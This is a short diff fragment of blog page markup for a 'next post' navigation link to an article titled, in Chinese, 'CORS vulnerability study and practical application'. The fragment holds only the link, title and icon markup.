+                                                                    <a href="/2019/07/21/%5Bold%5DCORS%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%8F%8A%E5%AE%9E%E6%88%98%E5%BA%94%E7%94%A8/">
+                                                                        <span class="hidden-mobile">CORS漏洞学习及实战应用</span>
                                                                         <span class="visible-mobile">下一篇</span>
                                                                         <i class="iconfont icon-arrowright"></i>
                                                                     </a>
